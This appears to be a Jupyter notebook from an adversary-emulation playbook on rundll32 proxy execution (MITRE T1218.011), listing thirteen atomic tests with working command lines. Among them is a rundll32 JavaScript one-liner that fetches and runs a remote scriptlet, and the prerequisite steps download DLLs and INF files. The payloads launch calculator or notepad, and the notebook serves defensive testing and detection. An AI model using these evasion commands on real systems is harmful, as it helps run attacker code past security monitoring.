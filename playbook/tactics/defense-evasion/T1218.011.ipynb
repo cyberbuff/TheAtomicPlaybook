{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "f5441521",
   "metadata": {},
   "source": "# T1218.011 - Rundll32\nAdversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e. [Shared Modules](https://attack.mitre.org/techniques/T1129)), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex: <code>rundll32.exe {DLLname, DLLfunction}</code>).\n\nRundll32.exe can also be used to execute [Control Panel](https://attack.mitre.org/techniques/T1218/002) Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)\n\nRundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion)\n\nAdversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command <code>rundll32.exe ExampleDLL.dll, ExampleFunction</code>, rundll32.exe would first attempt to execute <code>ExampleFunctionW</code>, or failing that <code>ExampleFunctionA</code>, before loading <code>ExampleFunction</code>). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending <code>W</code> and/or <code>A</code> to harmless ones.(Citation: Attackify Rundll32.exe Obscurity)(Citation: Github NoRunDll) DLL functions can also be exported and executed by an ordinal number (ex: <code>rundll32.exe file.dll,#1</code>).\n\nAdditionally, adversaries may use [Masquerading](https://attack.mitre.org/techniques/T1036) techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.(Citation: rundll32.exe defense evasion) "
  },
  {
   "cell_type": "markdown",
   "id": "aa20c4d4",
   "metadata": {},
   "source": "## Atomic Tests"
  },
  {
   "cell_type": "markdown",
   "id": "f6568f8f",
   "metadata": {},
   "source": [
    "### Atomic Test #1 - Rundll32 execute JavaScript Remote Payload With GetObject",
    "Test execution of a remote script using rundll32.exe. Upon execution notepad.exe will be opened. \nThis has been used by Win32/Poweliks malware and works as described [here](https://www.stormshield.com/news/poweliks-command-line-confusion/)\n\nNote: The GetObject function is no longer supported in Internet Explorer v9 (2011) and later so this technique would only work where very old versions of IE are installed. \n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nrundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1218.011/src/T1218.011.sct\").Exec();window.close();\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "23e0519a",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 1"
  },
  {
   "cell_type": "markdown",
   "id": "cbfd22d3",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ntaskkill /IM notepad.exe /f\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3537230c",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 1 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "b70a91ef",
   "metadata": {},
   "source": [
    "### Atomic Test #2 - Rundll32 execute VBscript command",
    "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nrundll32 vbscript:\"\\..\\mshtml,RunHTMLApplication \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e7f47fc3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 2"
  },
  {
   "cell_type": "markdown",
   "id": "677cf09b",
   "metadata": {},
   "source": [
    "### Atomic Test #3 - Rundll32 execute VBscript command using Ordinal number",
    "Test execution of a command using rundll32.exe and VBscript in a similar manner to the JavaScript test.\nTechnique documented by Hexacorn- http://www.hexacorn.com/blog/2019/10/29/rundll32-with-a-vbscript-protocol/\nUpon execution calc.exe will be launched\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nrundll32 vbscript:\"\\..\\mshtml,#135 \"+String(CreateObject(\"WScript.Shell\").Run(\"calc.exe\"),0)\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "506b2bf6",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 3"
  },
  {
   "cell_type": "markdown",
   "id": "738b2db4",
   "metadata": {},
   "source": "### Atomic Test #4 - Rundll32 advpack.dll Execution\nTest execution of a command using rundll32.exe with advpack.dll.\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Advpack.yml\nUpon execution calc.exe will be launched\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf\" -OutFile \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2a03f693",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 4 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "5009706e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nrundll32.exe advpack.dll,LaunchINFSection \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\",DefaultInstall_SingleUser,1,\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "64607809",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 4"
  },
  {
   "cell_type": "markdown",
   "id": "d642021a",
   "metadata": {},
   "source": "### Atomic Test #5 - Rundll32 ieadvpack.dll Execution\nTest execution of a command using rundll32.exe with ieadvpack.dll.\nUpon execution calc.exe will be launched\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Ieadvpack.yml\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011.inf\" -OutFile \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7e92a37e",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 5 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "fe65527e",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nrundll32.exe ieadvpack.dll,LaunchINFSection \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011.inf\",DefaultInstall_SingleUser,1,\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "459ba1ba",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 5"
  },
  {
   "cell_type": "markdown",
   "id": "02be220c",
   "metadata": {},
   "source": "### Atomic Test #6 - Rundll32 syssetup.dll Execution\nTest execution of a command using rundll32.exe with syssetup.dll. Upon execution, a window saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Syssetup.yml\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf\" -OutFile \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "86006bf0",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 6 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "fc4f5e3a",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nrundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e65925fa",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 6"
  },
  {
   "cell_type": "markdown",
   "id": "f400b794",
   "metadata": {},
   "source": "### Atomic Test #7 - Rundll32 setupapi.dll Execution\nTest execution of a command using rundll32.exe with setupapi.dll. Upon execution, a windows saying \"installation failed\" will be opened\n\nReference: https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSLibraries/Setupapi.yml\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Inf file must exist on disk at specified location (\"#{inf_to_execute}\")\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nNew-Item -Type Directory (split-path \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\") -ErrorAction ignore | Out-Null\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.011/src/T1218.011_DefaultInstall.inf\" -OutFile \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "374de1bb",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 7 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "8654a8f4",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nrundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 \"PathToAtomicsFolder\\T1218.011\\src\\T1218.011_DefaultInstall.inf\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "852054bd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 7"
  },
  {
   "cell_type": "markdown",
   "id": "95ce74c8",
   "metadata": {},
   "source": [
    "### Atomic Test #8 - Execution of HTA and VBS Files using Rundll32 and URL.dll",
    "IcedID uses this TTP as follows:\n  rundll32.exe url.dll,OpenURL %PUBLIC%\\index.hta\nTrickbot uses this TTP as follows:\n  rundll32.exe URL.dll,FileProtocolHandler C:\\\\..\\\\Detail\\\\akteullen.vbs\n\nIn this atomic, the sample hta file opens the calculator and the vbs file shows a message dialog with \"rundll32 spawned wscript\"\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nrundll32.exe url.dll,OpenURL \"PathToAtomicsFolder\\T1218.011\\src\\index.hta\"\nrundll32.exe URL.dll,FileProtocolHandler \"PathToAtomicsFolder\\T1218.011\\src\\akteullen.vbs\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e8293ee2",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 8"
  },
  {
   "cell_type": "markdown",
   "id": "cd8b45e5",
   "metadata": {},
   "source": [
    "### Atomic Test #9 - Launches an executable using Rundll32 and pcwutl.dll",
    "Executes the LaunchApplication function in pcwutl.dll to proxy execution of an executable.\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nrundll32.exe pcwutl.dll,LaunchApplication %windir%\\System32\\notepad.exe\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "7f63e942",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 9"
  },
  {
   "cell_type": "markdown",
   "id": "b4a0bf12",
   "metadata": {},
   "source": "### Atomic Test #10 - Execution of non-dll using rundll32.exe\nRundll32.exe running non-dll \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: Non-dll file must exist on disk at specified location\n\n##### Check Prereq Commands:\n```powershell\nif (Test-Path C:\\Users\\$env:username\\Downloads\\calc.png) {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```powershell\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll\" -OutFile \"C:\\Users\\$env:username\\Downloads\\calc.png\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3b5385fd",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 10 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "ad0b3aa4",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `powershell`\n",
    "```powershell\nrundll32.exe C:\\Users\\$env:username\\Downloads\\calc.png, StartW\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "1ef4f5c5",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 10"
  },
  {
   "cell_type": "markdown",
   "id": "5bfc172d",
   "metadata": {},
   "source": "### Atomic Test #11 - Rundll32 with Ordinal Value\nRundll32.exe loading dll using ordinal value #2 to DLLRegisterServer. \nUpon successful execution, Calc.exe will spawn.\n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: DLL file must exist on disk at specified location\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx64.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.010/bin/AllTheThingsx64.dll\" -OutFile \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx64.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "29a63d36",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 11 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "d329e8a0",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nrundll32.exe \"PathToAtomicsFolder\\T1218.010\\bin\\AllTheThingsx64.dll\",#2\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "2ede9196",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 11"
  },
  {
   "cell_type": "markdown",
   "id": "6c275878",
   "metadata": {},
   "source": "### Atomic Test #12 - Rundll32 with Control_RunDLL\nRundll32.exe loading dll with 'control_rundll' within the command-line, loading a .cpl or another file type related to CVE-2021-40444. \n\n**Supported Platforms:** windows\n#### Dependencies:  Run with `powershell`!\n##### Description: DLL file must exist on disk at specified location\n\n##### Check Prereq Commands:\n```cmd\nif (Test-Path \"PathToAtomicsFolder\\T1047\\bin\\calc.dll\") {exit 0} else {exit 1}\n\n```\n##### Get Prereq Commands:\n```cmd\nInvoke-WebRequest \"https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1047/bin/calc.dll\" -OutFile \"PathToAtomicsFolder\\T1047\\bin\\calc.dll\"\n\n```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "c5cc6809",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 12 -GetPreReqs"
  },
  {
   "cell_type": "markdown",
   "id": "11339545",
   "metadata": {},
   "source": [
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\nrundll32.exe shell32.dll,Control_RunDLL \"PathToAtomicsFolder\\T1047\\bin\\calc.dll\"\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "b21859af",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 12"
  },
  {
   "cell_type": "markdown",
   "id": "b01f6eb6",
   "metadata": {},
   "source": [
    "### Atomic Test #13 - Rundll32 with desk.cpl",
    "Rundll32.exe loading an executable renamed as .scr using desk.cpl \nReference: \n  - [LOLBAS - Libraries/Desk](https://lolbas-project.github.io/lolbas/Libraries/Desk/)\nSIGMA rules:\n  - [SCR File Write Event](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/file_event/file_event_win_new_src_file.yml)\n  - [Rundll32 InstallScreenSaver Execution](https://github.com/SigmaHQ/sigma/blob/b53f08b081e0a50099be9b9e8eced82097fdbaf2/rules/windows/process_creation/proc_creation_win_lolbin_rundll32_installscreensaver.yml)\n",
    "**Supported Platforms:** windows",
    "#### Attack Commands: Run with `command_prompt`\n",
    "```command_prompt\ncopy %windir%\\System32\\calc.exe not_an_scr.scr\nrundll32.exe desk.cpl,InstallScreenSaver not_an_scr.scr\n```"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "98486847",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 13"
  },
  {
   "cell_type": "markdown",
   "id": "48556284",
   "metadata": {},
   "source": "#### Cleanup: \n```cmd\ndel not_an_scr.scr```"
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "44b830e3",
   "metadata": {},
   "outputs": [],
   "source": "Invoke-AtomicTest T1218.011 -TestNumbers 13 -Cleanup"
  },
  {
   "cell_type": "markdown",
   "id": "31d75524",
   "metadata": {},
   "source": "## Detection\nUse process monitoring to monitor the execution and arguments of rundll32.exe. Compare recent invocations of rundll32.exe with prior history of known good arguments and loaded DLLs to determine anomalous and potentially adversarial activity.\n\nCommand arguments used with the rundll32.exe invocation may also be useful in determining the origin and purpose of the DLL being loaded. Analyzing DLL exports and comparing to runtime arguments may be useful in uncovering obfuscated function calls."
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": ".NET (PowerShell)",
   "language": "pwsh",
   "name": ".net-powershell"
  },
  "language_info": {
   "file_extension": ".ps1",
   "mimetype": "text/x-powershell",
   "name": "pwsh",
   "pygments_lexer": "powershell",
   "version": "7.0"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}